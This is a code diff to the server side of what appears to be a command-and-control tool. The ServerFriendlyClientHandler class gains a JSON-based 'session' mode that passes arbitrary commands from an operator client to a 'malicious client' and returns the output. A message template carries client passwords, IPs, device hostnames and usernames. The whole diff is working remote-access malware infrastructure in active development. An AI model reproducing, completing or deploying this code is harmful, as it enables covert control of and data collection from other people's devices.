@@ -611,47 +611,77 @@ class ServerFriendlyClientHandler:
         '''
 
         if client_command == "session":
+            """
+            Session is kind of special, it's a self contained command in that it does all the processing needed
+            within this for loop.
+            """
             # setting current_job variable for stat purposes
             self.client.under_control = True
             self.send_msg_to_friendlyclient(f"Session on {self.client.fullname} opened")
 
             ## telling client to go into a listening loop, client sends back an okay, otherwise this hangs
             ## as it's waiting for a response
-            self.client.send_msg_to_maliciousclient("session")
+
+            ## this needs to get moved to JSON... or just pass along the JSON
+            #self.client.send_msg_to_maliciousclient("session")
+
+            ## creating JSON to send to client
+            self.client.send_msg_to_maliciousclient(self.json_format(cmd="session"))
             
             while True: #self.client.under_control:
                 #logging.debug(f"[Server (session with {self.client.fullname})]")
                 try:
                     ## Need to re-do client to shut up & listen (aka not reconnect) when not getting the "wait" command
-                    
-                    ## listen for friendly client
-                    #a = bytes_decode(self.conn.recv(1024))
+
 
                     logging.debug("[Server (Session: )] Waiting on command from friendly client")
                     raw_session_message = self.recieve_msg_from_friendlyclient()
+
+                    ## load json:
+                    dict_session_message = json.loads(raw_session_message)
+
+
+                    ## validate JSON?
+
+
+                    #session_command = raw_session_message.split("\\|/")[2]
+                    session_command = dict_session_message["Main"]["msg"]["msg_content"]["command"]
+
+                    ## Strip JSON of any sensitive data (makes it so the messages from Fclient can be passed
+                    ## directly to the Mclient without an additional parser here. Orrrrr just don't send it in the first
+                    ##place, and this could be a backup?
+
+                    '''
+                    dict_session_message["Main"]["general"]["client_id"] = ""
+                    dict_session_message["Main"]["general"]["password"] = ""
+                    dict_session_message["conn"]["client_ip"] = ""
+                    dict_session_message["conn"]["clinet_port"] = ""
                     
-                    ## msg looks like: !_clientcommand_!\\/id\|/command. This is done for server filtering purposes
+                    # or
+                    for i in key_to_exclude: ##<< this could be a setting/profile thing passed here
+                    ## figure out how to do nested keys like this
+                        dict_session_message[i] = ""
                     
-                    session_command = raw_session_message.split("\\|/")[2]
+                    '''
 
                     # Updating GUI with latest session command
                     #self.client_stats_update(current_job=f"{session_command}", client_name=client_name)
 
+                    ## if session_command_key = break
                     if session_command == "break":
                         logging.debug(f"[Server (session: {self.client.fullname})] : Session breaking")
                     else:
-                        #print("else")
-                        ## sending to client
-                        #self.client.send_msg_to_maliciousclient(f"{session_command}\\|/{session_command_value}")
-                        
-                        ## just sending it over, the client can do the parsing for session stuff. 
-                        ## client names aren't needed for sessions, or just include it automatically...
-                        
                         self.client.send_msg_to_maliciousclient(session_command)
                         ##listening back for response
                         results = self.client.recieve_msg_from_maliciousclient()
+                        ## sending JSON from client directly back to fclient, which will handle the parsing
                         self.send_msg_to_friendlyclient(results)
-                    
+
+                except ValueError as ve:
+                    logging.warning(f"[Server (session)] Error with JSON data: {ve}")
+                except KeyError as ke:
+                    logging.warning(f"[Server (session)] Key error, most likely invalid, or misformed JSON; Error: {ke} \n "
+                                    f"Data received (should be JSON): {raw_session_message}")
                 except Exception as e:
                     print(e)
         
@@ -780,28 +810,52 @@ class ServerFriendlyClientHandler:
                 logging.debug(f"[Server (send_msg_to_friendlyclient: {self.username})] MSG TRANSFER COMPLETE")
 
         return complete_msg
-    
 
-    ##== Dev Note!! These need to always return SOMETHING in their lists, 
-    ## that way it's  played safely and doesnt error  out
-    def parse_msg_for_server(self, raw_message) -> list:        
-        ## strip uneeded code here, replace THEN strip (goes from str -> list, the split returns a list)
-        try:
-            parsed_results_list = raw_message.split("\\|/")
-        except:
-            parsed_results_list = ["EMPTY","EMPTY","EMPTY"]
+    def json_format(self, action="", cmd="", cmd_value="", msg_to="", client_id=""):
+        '''
+        JSON formatter for sending messages to the server
 
-        return parsed_results_list
-    
-    def parse_msg_for_client(self, raw_message) -> list:
-        ## strip uneeded code here, replace THEN strip (goes from str -> list, the split returns a list)
-        try:
-            parsed_results_list = raw_message.split()
-        except:
-            parsed_results_list = ["EMPTY","EMPTY","EMPTY"]
-        
-        return parsed_results_list
-    
+        Returns a stringified json object
+
+        '''
+
+        ## Expanded our here for readability
+        user_msg_to_be_sent = {
+            "Main": {
+                "general": {
+                    "action": "",
+                    "client_id": "",
+                    "client_type": "malicious",
+                    "password": "empty"
+                },
+                "conn": {
+                    "client_ip": "",
+                    "client_port": ""
+                },
+                "msg": {
+                    "msg_to": "msg_to",
+                    "msg_content": {
+                        "command": cmd,
+                        "value": cmd_value
+                    },
+                    "msg_length": 1234,
+                    "msg_hash": "hash of message (later)"
+                },
+                "stats": {
+                    "latest_checkin": "time.now",
+                    "device_hostname": "hostname",
+                    "device_username": "username"
+                },
+                "security": {
+                    "client_hash": "hash of client (later)",
+                    "server_hash": "hash of server (later)"
+                }
+            }
+        }
+
+        ## returns json object as a string
+        return json.dumps(user_msg_to_be_sent)
+
     def fileread(self, filepath=""):        
         if os.path.isfile(filepath):
             with open(filepath, "r") as file_to_read:
